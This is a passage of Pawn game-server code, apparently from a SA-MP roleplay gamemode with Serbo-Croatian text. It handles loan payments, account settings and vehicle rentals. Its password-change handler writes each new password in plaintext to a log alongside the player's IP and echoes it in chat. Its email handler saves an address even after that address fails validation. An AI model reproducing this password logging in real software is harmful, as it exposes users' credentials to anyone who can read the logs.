					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `credit_amount` = '%d', `credit_installment` = '%d', `credit_rest` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ playerid ][ xIznosKredita ], PlayerInfo[ playerid ][ xIznosRate ], PlayerInfo[ playerid ][ xPreostaloZaOtplatu ], PlayerInfo[ playerid ][ xID ] );
	   				mysql_tquery( mSQL, q );
			    }
			    else return SendErrorMessage( playerid, "Nemate dovoljno novca za otplacivanje kredita." );
			}
		}
	}
	else if(dialogid == dialog_PROMENARATEKREDITA )
	{
		if( !response ) return 1;
		if( response )
		{
			new iznos;
			if( sscanf( inputtext, "i", iznos ) ) return ShowPlayerDialog( playerid, dialog_PROMENARATEKREDITA, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Upisite novi iznos rate koje cete otplacivati...", "Potvrdi", "Odustani" );
			if( iznos < 1000 || iznos > 4000 )
			{
				SendErrorMessage( playerid, "Suma ne moze biti manja od 1000$ i veca od 4000$");
				ShowPlayerDialog( playerid, dialog_PROMENARATEKREDITA, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Upisite novi iznos rate koje cete otplacivati...", "Potvrdi", "Odustani" );
				return 1;
			}
			PlayerInfo[ playerid ][ xIznosRate ] = iznos;
			sql_user_update_integer( playerid, "credit_installment", PlayerInfo[ playerid ][ xIznosRate ] );
			SCMF( playerid, ZUTA, "(KREDIT): Podesili ste iznos rate kredita na {FFFFFF}($%d).", iznos );
		}
		else ShowPlayerDialog( playerid, dialog_INFOKREDIT, DIALOG_STYLE_LIST, D_NASLOV, "Info Kredit\nPromena Iznosa Rate", "Potvrdi", "Odustani" );
	}
	else if(dialogid == dialog_SETTINGS)
	{
		if(response)
		{
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid, dialog_CHANGEPASSWORD, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Upisi novu sifru i dobro je zapamti. U - Team ne odgovara za nestale/ukradene sifre.", "Promjeni", "Odustani");
				case 1: ShowPlayerDialog(playerid, dialog_CHANGEEMAIL, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite vasu e-mail adresu.\nE-mail adresa ce nam posluziti u vracanju vasih passworda - bez maila nema vracanja passworda.", "Promjeni", "Odustani");
				case 2: ShowPlayerDialog(playerid, dialog_CHANGEAGE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Upisite Vase godine (12>70):", "Promjeni", "Odustani");
				case 3: ShowPlayerDialog(playerid, dialog_CHANGESPOL, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Izaberite Vas spol:", "{7EBCE6}Muski", "{E67ED1}Zenski");
				case 4: ShowPlayerDialog(playerid, dialog_CHANGECOUNTRY, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Makedonija\n{4282C0}(2). {FFFFFF}Hrvatska\n{4282C0}(3). {FFFFFF}Srbija\n{4282C0}(4). {FFFFFF}Montenegro\n{4282C0}(5). {FFFFFF}Bosna i Hercegovina\n{4282C0}(6). {FFFFFF}Other", "Promjeni", "Odustani");
				case 5:
				{
					if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 )
					{
				        ShowPlayerDialog( playerid, dialog_SPAWNCHANGE, DIALOG_STYLE_LIST, D_NASLOV,
																									"{4282C0}(1). {FFFFFF}Default spawn\n\
																									{4282C0}(2). {FFFFFF}Organizacijski spawn\n\
																									{4282C0}(3). {FFFFFF}Spawn imovina 1\n\
																									{4282C0}(4). {FFFFFF}Spawn imovina 2\n\
																									{4282C0}(5). {FFFFFF}Spawn imovina 3\n\
																									{4282C0}(6). {FFFFFF}Iznajmljena soba\n\
																									{4282C0}(7). {FFFFFF}A/GM baza", "Odaberi", "Odustani" );
				    }
				    else
					{
						ShowPlayerDialog( playerid, dialog_SPAWNCHANGE, DIALOG_STYLE_LIST, D_NASLOV,
																									"{4282C0}(1). {FFFFFF}Default spawn\n\
																									{4282C0}(2). {FFFFFF}Organizacijski spawn\n\
																									{4282C0}(3). {FFFFFF}Spawn imovina 1\n\
																									{4282C0}(4). {FFFFFF}Spawn imovina 2\n\
																									{4282C0}(5). {FFFFFF}Spawn imovina 3\n\
																									{4282C0}(6). {FFFFFF}Iznajmljena soba", "Odaberi", "Odustani" );
					}
				}
				case 6:
				{
					ShowPlayerDialog(playerid, dialog_TEXTDRAWOVI, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV, 
																											"#\tOpcija\tIzgled\n\
																											{4282C0}(1).\t{FFFFFF}Toggle ON/OFF\t{FFFFFF}\n\
																											{4282C0}(2).\t{FFFFFF}Default\t{4282C0}||||||||||\n\
																											{4282C0}(3).\t{FFFFFF}Light Red\t{FA7373}||||||||||\n\
																											{4282C0}(4).\t{FFFFFF}Red\t{F01F1F}||||||||||\n\
																											{4282C0}(5).\t{FFFFFF}Dark Red\t{941010}||||||||||\n\
																											{4282C0}(6).\t{FFFFFF}Light Orange\t{FA9973}||||||||||\n\
																											{4282C0}(7).\t{FFFFFF}Orange\t{F0611F}||||||||||\n\
																											{4282C0}(8).\t{FFFFFF}Dark Orange\t{BA7900}||||||||||\n\
																											{4282C0}(9).\t{FFFFFF}Light Yellow\t{FAE173}||||||||||\n\
																											{4282C0}(10).\t{FFFFFF}Yellow\t{E9F01F}||||||||||\n\
																											{4282C0}(11).\t{FFFFFF}Dark Yellow\t{B7BA00}||||||||||\n\
																											{4282C0}(12).\t{FFFFFF}Light Green\t{7AFA73}||||||||||\n\
																											{4282C0}(13).\t{FFFFFF}Green\t{50F01F}||||||||||\n\
																											{4282C0}(14).\t{FFFFFF}Dark Green\t{069602}||||||||||\n\
																											{4282C0}(15).\t{FFFFFF}Light Blue\t{73FAE1}||||||||||\n\
																											{4282C0}(16).\t{FFFFFF}Blue\t{1FAEF0}||||||||||\n\
																											{4282C0}(17).\t{FFFFFF}Dark Blue\t{026096}||||||||||\n\
																											{4282C0}(18).\t{FFFFFF}Light Purple\t{A273FA}||||||||||\n\
																											{4282C0}(19).\t{FFFFFF}Purple\t{6F1FF0}||||||||||\n\
																											{4282C0}(20).\t{FFFFFF}Dark Purple\t{4C0296}||||||||||\n\
																											{4282C0}(21).\t{FFFFFF}Light Pink\t{FA73EA}||||||||||\n\
																											{4282C0}(22).\t{FFFFFF}Pink\t{F01FDF}||||||||||\n\
																											{4282C0}(23).\t{FFFFFF}Dark Pink\t{B8007D}||||||||||\n\
																											{4282C0}(24).\t{FFFFFF}Black\t{000000}||||||||||", "Odaberi", "Odustani");
				}
			}
		}
	}
	else if(dialogid == dialog_CHANGEPASSWORD )
	{
	    if( response )
		{
	        if( strlen(inputtext) < 6 || strlen(inputtext) > 20 || !IsPasswordCorrent(inputtext))
			{
	    		SendErrorMessage( playerid, "Password moze sadrzavati minimalno 6, a maximalno 20 znakova, samo slova i brojke" );
			    return 1;
			}
		    else
			{
		        new hash_pass[ 65 ];
    			SHA256_PassHash( inputtext, ImeIgraca(playerid), hash_pass, sizeof hash_pass );

				strmid( PlayerInfo[ playerid ][ xLozinka ], hash_pass, 0, strlen( hash_pass ), 255 );
				SCMF( playerid, 0xFF6347FF, "(PASSWORD): Nova lozinka {FFFFFF}%s.", inputtext );

				new q[ 300 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `password` = '%e' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ playerid ][ xLozinka ], PlayerInfo[ playerid ][ xID ] );
				mysql_tquery( mSQL, q );

				new str[ 22 ];
       			GetPlayerIp( playerid, str, 22 );
				WriteLog("log-password", "IP: %s | Igrac %s je promenio lozinku na %d", str, ImeIgraca( playerid ), inputtext);
    		}
	    }
	}
	else if(dialogid == dialog_CHANGEEMAIL )
	{
	    if( !response ) return 1;
		if( response )
		{
            new mailstring = strfind( inputtext, "@", true ), tackaastring = strfind( inputtext, ".", true );
	        if( mailstring == -1 || tackaastring == -1 || !IsEmailCorrect(inputtext) || strlen(inputtext) < 6 || strlen(inputtext) > 70)
			{
	            ShowPlayerDialog( playerid, dialog_CHANGEEMAIL, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite vasu e-mail adresu.\nE-mail adresa ce nam posluziti u vracanju vasih passworda - bez maila nema vracanja passworda.", "Unos", "Izlaz");
			}

			strmid( PlayerInfo[ playerid ][ xMail ], inputtext, 0, strlen( inputtext ), 34 );

			new q[ 128 ];
		    mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `email` = '%e' WHERE `user_id` = '%d'", PlayerInfo[ playerid ][ xMail ], PlayerInfo[ playerid ][ xID ] );
		    mysql_tquery( mSQL, q );

			SCMF( playerid, 0xFF6347FF, "(E-MAIL): Promenili ste e-mail u {FFFFFF}%s.", inputtext );
		}
	}
	else if(dialogid == dialog_CHANGEAGE)
	{
		if(response)
		{
			if(strval(inputtext) < 12 || strval(inputtext) > 70) return ShowPlayerDialog(playerid, dialog_CHANGEAGE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Upisite Vase godine (12>70):", "Potvrdi", "Zatvori");
		
			PlayerInfo[playerid][xGodine] = strval(inputtext);
			sql_user_update_integer(playerid, "age", PlayerInfo[playerid][xGodine]);

			SCMF(playerid, 0xFF6347FF, "(GODINE): Postavili ste vase godine na {FFFFFF}%d.", PlayerInfo[playerid][xGodine]);
		}
	}
	else if(dialogid == dialog_CHANGESPOL)
	{
		PlayerInfo[playerid][xPol] = (response == 1 ? 1 : 2);
		sql_user_update_integer(playerid, "sex", PlayerInfo[playerid][xPol]);

		SCMF(playerid, 0xFF6347FF, "(SPOL): Postavili ste vas spol na {FFFFFF}%s.", (PlayerInfo[playerid][xPol] == 1 ? "muski" : "zenski"));
	}
	else if(dialogid == dialog_CHANGECOUNTRY)
	{
		if(response)
		{
			PlayerInfo[playerid][xDrzava] = listitem+1;
			sql_user_update_integer(playerid, "country", PlayerInfo[playerid][xDrzava]);

			SCMF(playerid, 0xFF6347FF, "(GODINE): Postavili ste vas drzavu/porijeklo na {FFFFFF}%s.", getCountryName(PlayerInfo[playerid][xDrzava]));
		}
	}
	else if(dialogid == dialog_TEXTDRAWOVI) 
	{
    	if(response) 
    	{
			switch(listitem) 
			{
				case 0: TogPlayerHud(playerid);
				case 1 .. 23:
				{
					PlayerInfo[playerid][xTDColor] = listitem-1;
					sql_user_update_integer(playerid, "xTDColor", PlayerInfo[playerid][xTDColor]);

					BuildIngameTextDraws(playerid, false);
					BuildIngameTextDraws(playerid, true);
				}
			}
		}
 	}
	else if(dialogid == dialog_RENTANJE )
	{
		if( response )
		{
		    switch(listitem)
			{
				case 0:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 500) return SendErrorMessage(playerid, "Nemate dovoljno novca - $500.");

					DajIgracuNovac(playerid, -500);
					BussinesRentMoney( playerid, 400 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(510, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[playerid] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste bajs na 15 minuta za $500.");
				}
				case 1:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 2000) return SendErrorMessage(playerid, "Nemate dovoljno novca - $2000.");

					DajIgracuNovac(playerid, -2000);
					BussinesRentMoney( playerid, 1750 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(462, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[ playerid ] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste Faggio na 15 minuta za $2000.");
				}
				case 2:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 2500) return SendErrorMessage(playerid, "Nemate dovoljno novca - $2500.");

					DajIgracuNovac(playerid, -2500);
					BussinesRentMoney( playerid, 2250 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(439, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[ playerid ] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste Stallion na 15 minuta za $2500.");
				}
				case 3:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 3000) return SendErrorMessage(playerid, "Nemate dovoljno novca - $3000.");

					DajIgracuNovac(playerid, -3000);
					BussinesRentMoney( playerid, 2500 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(426, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[ playerid ] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste Premier na 15 minuta za $3000.");
				}
				case 4:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 3500) return SendErrorMessage(playerid, "Nemate dovoljno novca - $3500.");

					DajIgracuNovac(playerid, -3500);
					BussinesRentMoney( playerid, 3200 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(405, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[ playerid ] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste Sentinel na 15 minuta za $3500.");
				}
				case 5:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 4000) return SendErrorMessage(playerid, "Nemate dovoljno novca - $4000.");

					DajIgracuNovac(playerid, -4000);
					BussinesRentMoney( playerid, 3500 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(400, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[ playerid ] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste Landstalker na 15 minuta za $4000.");
				}
				case 6:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 4250) return SendErrorMessage(playerid, "Nemate dovoljno novca - $4250.");

					DajIgracuNovac(playerid, -4250);
					BussinesRentMoney( playerid, 3700 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(506, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[ playerid ] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste Super GT na 15 minuta za $4250.");
				}
				case 7:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 4500) return SendErrorMessage(playerid, "Nemate dovoljno novca - $4500.");

					DajIgracuNovac(playerid, -4500);
					BussinesRentMoney( playerid, 4000 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(402, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[ playerid ] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste Buffalo na 15 minuta za $4500.");
				}
				case 8:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 5000) return SendErrorMessage(playerid, "Nemate dovoljno novca - $5000.");

					DajIgracuNovac(playerid, -5000);
					BussinesRentMoney( playerid, 4500 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(560, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[ playerid ] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste Sultan na 15 minuta za $5000.");
				}
				case 9:
				{
					new gnrv = GetNearestRentVehicle(playerid);
					if(gnrv == -1) return SendErrorMessage(playerid, "Niste u blizini nekog renta.");
					if(GetPlayerMoney(playerid) < 6000) return SendErrorMessage(playerid, "Nemate dovoljno novca - $6000.");

					DajIgracuNovac(playerid, -6000);
					BussinesRentMoney( playerid, 5000 );

					RentVozilo[ playerid ] = SMG_CreateVehicle(411, VoziloRentInfo[gnrv][vrSpawn_Pos_X], VoziloRentInfo[gnrv][vrSpawn_Pos_Y], VoziloRentInfo[gnrv][vrSpawn_Pos_Z], VoziloRentInfo[gnrv][vrSpawn_Pos_A], 222, 222, -1 );
					LinkVehicleToInterior( RentVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( RentVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( RentVozilo[ playerid ] );
					vCanDrive[ RentVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, RentVozilo[ playerid ], 0 );
					ResetVehicleStatistics( RentVozilo[ playerid ] );

					new string[ 20+MAX_PLAYER_NAME+1 ];
